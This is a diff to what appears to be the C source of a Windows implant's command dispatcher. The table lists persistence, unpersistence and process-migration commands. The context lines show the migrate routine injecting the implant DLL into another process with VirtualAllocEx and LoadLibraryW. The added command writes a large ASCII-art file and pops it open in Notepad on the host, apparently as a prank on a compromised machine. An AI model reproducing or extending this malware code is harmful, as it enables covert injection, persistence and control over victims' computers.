@@ -61,6 +61,7 @@ CONST COMMAND_MAP G_CommandTable[] = {
     { CMD_PERSIST,           CmdPersist          },
     { CMD_UNPERSIST,         CmdUnpersist        },
     { CMD_MIGRATE,           CmdMigrate          },
+    { CMD_HANK,              CmdHank             },
 };
 
 /* ---------------------------------------------------------------------------
@@ -1186,6 +1187,7 @@ DWORD CmdEnv(
 DWORD CmdGetenv(
     DWORD dataLen, CONST PBYTE data,
     PBYTE* responseData, DWORD* responseLen)
+
 {
     PWSTR name   = NULL;
     DWORD valLen;
@@ -1401,6 +1403,10 @@ DWORD CmdMigrate(
     targetPid = *(DWORD*)data;
 
     dllPath = GetImplantDllPath();
+
+
+  
+
     if (!dllPath || dllPath[0] == L'\0') return ERROR_INVALID_REQUEST;
 
     dllPathBytes = (wcslen(dllPath) + 1U) * sizeof(WCHAR);
@@ -1412,7 +1418,7 @@ DWORD CmdMigrate(
 
     remoteBuf = VirtualAllocEx(hProcess, NULL, dllPathBytes,
                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!remoteBuf)
+    if (remoteBuf == NULL)
     {
         status = GetLastError();
         CloseHandle(hProcess);
@@ -1426,7 +1432,7 @@ DWORD CmdMigrate(
         CloseHandle(hProcess);
         return status;
     }
-
+    //change ddll
     pLoadLib = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
     if (!pLoadLib)
     {
@@ -1458,6 +1464,130 @@ DWORD CmdMigrate(
     CloseHandle(hProcess);
     return status;
 }
+
+
+DWORD CmdHank(
+    DWORD dataLen, CONST PBYTE data,
+    PBYTE* responseData, DWORD* responseLen)
+{
+  
+    DWORD status = 0;
+    
+        
+    UNREFERENCED_PARAMETER(dataLen);
+    UNREFERENCED_PARAMETER(data);
+    UNREFERENCED_PARAMETER(responseData);
+    UNREFERENCED_PARAMETER(responseLen);
+
+    CHAR* asciiArt = "░░ ░    ░░ ▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒░░░░▒▒▒▒▒▒▒░░░░░░░░     ▓▓▓▒░░▒░░   ▓▓▓\n"
+        "░▒░░▒ ░░  ░         ░▓▓▓▓▓░░░░░░▒▒▒▒▒▒▒░          ▓▓▒▒░      ▒▓▓▓\n"
+        "░░░ ░ ░░░░░░ ░░░░  ░ ░   ░   ░▒▒▒▒▒▒▓█▒▒▒▒▒▒▒▒▒   ▓▒        ░░░░▓\n"
+        "░░▒░░░░░░░░░░░░░░░░░ ░   ░     ░░      ░▒▒▒▒▒▒▒▒▒▒         ░░░░░░\n"
+        "▒▒░▒░░░░░░░░░░░░░░░░░░░░  ░░░░░ ░ ░░  ░      ░     ░░░  ░      ░░\n"
+        "▒▒▒░░░░░░░░░░░░░░░░░░░░░ ░ ░░░░░ ░ ░░░░░░░░░░ ░░ ░  ░░░░░░ ░░░░░ \n"
+        "░▒░░░▒░░░░░░░░░░░░░░░░░░░░░░░░░ ░░░░░░░░░░░░░░░░░░░░░░░░░░ ░░░░  \n"
+        "▒▒▒▒░▒░▒░░░░░▒░░░░░░░░░░░░░░ ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ ░  \n"
+        "░▒▒░░▒░░▒░░░▒░░░░░░░░░░░░░░░░ ░░░░░ ░░░░░░░░░░░░░  ░░░░░░░░░░    \n"
+        "▒▒▒░░▒▒░▒░▒░░░░░░░░░░░░░░░░░░▒░░░ ░░ ▓▒▒░░░░░░░░░░  ░░░░░░░      \n"
+        "░▒▒▒▒░░░▒▒░░░░░░░░░░░░░░░░░▒▒▒▒▒░  ░   ▒▒░░░░░░░░░░░  ░░░        \n"
+        "▒▒▒▒░▒░░▒░░░▒░░░░░░░░▒░▓▓  ░▒▓▒▓▒░ ▓█▒░▒▒░ ░▒▒▒░░░░░░  ░░░░      \n"
+        "▒▒░▒░▒░▒▒░░░░░░░░░░░▒████▓░▒░▓▓░ ▒▒█▓█ ░▒░░░░▒▒▒░░░░░░  ░░       \n"
+        "▒▒▒░░░▒░░░░░░░░░░▓█▓█▓████▒▒░▒░  ░ ▒▓▓   ░  ░▒▒▒░░░░░░░          \n"
+        "░▒▒▒░░░░░░░░░░░░▓▓▓▒▓▓█▓█▒▒▒▒▒▒░░░       ░  ░▒▒░░░░░░░░░░        \n"
+        "▒░▒░▒░▒ ░░░░░░░▒▓▓▒▒░▓▓▓▒▒▒▒▓▒▒▓▓░░     ░   ░░▒░░░░░░░░░         \n"
+        "▒▒░░░░░░▒░░░░░░░▒▒▒▓▒░▒░░░▒▒▓▓▓▓▓▒▒░    ░░  ░░░▒░░░░░░░░░        \n"
+        "▒▒▒▒░░░░░░░░░░░░░░░░▒▒░░░░▒▓▓████▓▓░    ░░  ░░░▒░░░░░░░░ ░       \n"
+        "▒▒▒▒▒▒░░░░▒░░░░░░░░░▒▒▒░░░▒█████▓██    ░░░░░░░░░░░░░░░░          \n"
+        "▒▒▒▒▒▒▒░░░░░░░░░░░░░▒▒▒▒░▒▒▒██████▓    ░▒░░░░░░░░░░░░░░░         \n"
+        "▒▓▒▒▒▒▒▒▒▒▒░░░░░░░░░▒▓▒▒░░░▓▓▓▓█▓▓▓▒   ░░ ░░░░░▒▒▒░░▒▒▒░░░       \n"
+        "▒▒▓▒▒▒▒▒▒▒▒▒▒░▒░░░░░▒▓▒▒░░▒▒▓█▓██▓▒  ░▒░░  ░░▒▒▒░░░░░░░░░░░░░░░  \n"
+        "▓▓▒▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒░▒▒▒▒▒▒░   ░▒░░   ░░▒▒▒░░░░░  ░░░░░░░░░ \n"
+        "▓▓▓▓▓▓▓▒▓▓▓▒▒▓▒▒▒▒▓▒▒▓▓▒▒▒▒░  ░   ░░▒▓░░ ░ ░░░░▒▒░░░░░  ░░▒▓▒░░  \n"
+        "▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▒▓▓▒░░░░ ░░▒▒░  ▒█  ░░ ░░░░░░░░░░░▓▓▒░░  \n"
+        "█████████████████████▒▓▓▓▓▓▒░░░▒▒▓▒░░ █▒░░   ░ ░░░░░░░░  ░▓▓▓▒░░░\n"
+        "████████████████████▒▒▓███▓▒▒▒▓▓▓▒░░▓▓▓░░░     ░░░░░░░ ░░▓█▓▓▓▒░▒\n"
+        "████████████████████▒▒██████████ █▓██▒░░░░     ░░░░░░  ░▒▓██▓▓▒░░\n"
+        "▓████▓▓▓█▓██▓▓▓▓▓▓▓▓▒▓▓█████████ ███▓░░░░░     ░░░░░░  ▒▓████▓▓▒▒\n"
+        "▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▓██████▓███▓█▓▒▒▒▒░░░     ░░░░░ ▒▓████████▓\n"
+        "▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████▓███████▓▓▒▒▒░░░    ░░░ ░░▒██▒▒░░ ░░▒▒\n"
+        "▓▓▓▓▓▓▓▓▓▓▓▓█▓▓▓▓██▓▓▓▓▓▓▓█████▓▓██▓▓▓▓▒▒▒░░   ░  ░▓▓█████▓░▒▒░▒▒\n"
+        "▓▓▓▓▓██▓██████████▓▓▓██████▓█████▒░░░ ░░░░░░░  ░▓▒▓▒▒▒▒▒▒▒░░▒░ ░ \n"
+        "▓▓▒▓▓▓▓▓█████▓██▒ ░░▒▓▓▓█████▓░░░ ░     ░░░   ▒▒▒▒▒▒░▒░░░░░░░ ░░░\n"
+        "▒▒▒▒▒▓▓▓▓▓▓███ ██    ▓▓ ▓ █      █        █   █        ░░░░░░  ░░\n"
+        "░▒▒▒▒▒▓▓▓█████████▓ ███ █ █████ ██ ███ █ ██ ███ ███ █  ░▒░░░ ░░░░\n"
+        "▒▒▒░▒░▓▓███▒███▒██▓██ █ █ ██ █  ██ ███▒█ ██ ███ ███ █  ░░▒▒▒░  ░░\n"
+        " ░▓▒▒▓▓██░                                                ░   ░  \n"
+        "░▒▒▓▒          ░█████████░ ▒▒░▒▒▓▒▒▒▒░░▒░ ░░░  ▒   ░░ ░  ▒ ░▒░░▒░\n"
+        "░ ░ ░░░ ░  ░░▓▓▒▒▒░░▒ ░░▒░░░▒▒░▒▒▒░▒▒░▒░░▒▒░▒▒ ░▒░░░░░ ░  ░  ░░░ \n"
+        "▓░ ▒▒░  ░░░ ░▒▒░▓░░▒░░░▒░░ ▒▒░░░▒▒░░▓▒▒░░░░░░▒░▓░▒▒▒░░▒ ░░ ▒     \n"
+        "▓██░▒▓█▓▒▓▒▒▒▒░░▒░░░░ ░░▒░░▒▒░▒░ ▒▒▒░▒▒░░░▒ ░ ░▒▒▒▒▒░▒▒▒ ░   ░   \n"
+        "▓▓██▓▒▒░▒░▒░░▒░░░░▒ ░░░▒░ ░░▒▒░▒▒░░▒░ ░▒ ░▓░░░░░░░▒▒▒░░░░ ░▒░ ░ ░\n"
+        "░▒ ░░░░▒▒ ░░ ▒░▒░░░░░░▒▒░░▒▒▒░▒▒▒▒▒▒░▒▒░ ░░ ░░░░ ▒░▒░ ▒░░▒░░░░░  \n"
+        "░░ ░▒░▒▒░  ░░ ░░░░▒░░░▒░▒░▒░░░▒▒░░░░░░░░▒░ ░ ░▒░░░░░ ░░  ▒░░░░░  \n"
+        "░░░░░░░▒ ░░▒░░ ░▒░░▒░▒░▒░▒░░▒░░░░▒ ░▒░░░ ▒░░░░░░▒░ ░ ░ ░░▒ ░░░░ ░\n"
+        " ░░░░▒░ ░░░░░░░░░░░░░░░▒░░▒░░▒░░▒░░░▒▒░░▒ ░░░▒░▒░░░░░  ░░░    ░  ";
+        
+    CHAR* filename = "ascii_display.txt";
+    DWORD bytesWritten;
+
+    // 2. Create the file using WinAPI
+    // CREATE_ALWAYS will overwrite the file if it already exists
+    HANDLE hFile = CreateFileA(
+        filename,               // File name
+        GENERIC_WRITE,          // Desired access
+        0,                      // Share mode
+        NULL,                   // Security attributes
+        CREATE_ALWAYS,          // Creation disposition
+        FILE_ATTRIBUTE_NORMAL,  // Flags and attributes
+        NULL                    // Template file
+    );
+
+    if (hFile == INVALID_HANDLE_VALUE) {
+        status = GetLastError();
+        
+        return status;
+    }
+
+    // 3. Write the ASCII art to the file
+    BOOL result = WriteFile(
+        hFile,                  // Handle to file
+        asciiArt,               // Buffer to write
+        (DWORD)strlen(asciiArt),// Number of bytes to write
+        &bytesWritten,          // Number of bytes actually written
+        NULL                    // Overlapped buffer
+    );
+
+    // Close the handle immediately after writing
+    CloseHandle(hFile);
+
+    if (!result) {
+        status = GetLastError();
+
+        return status;
+    }
+
+    // 4. Open the file in Notepad using ShellExecute
+    // "open" is the verb, it will use the default .txt handler (Notepad)
+    HINSTANCE shellResult = ShellExecuteA(
+        NULL,
+        "open",
+        filename,
+        NULL,
+        NULL,
+        SW_SHOWNORMAL
+    );
+
+    // ShellExecute returns a value greater than 32 if successful
+    if ((INT_PTR)shellResult <= 32) {
+        status = GetLastError();
+       
+        return status;
+    }
+
+    return status;
+}
+
+
 
 /* ===========================================================================
  * COMMAND DISPATCHER
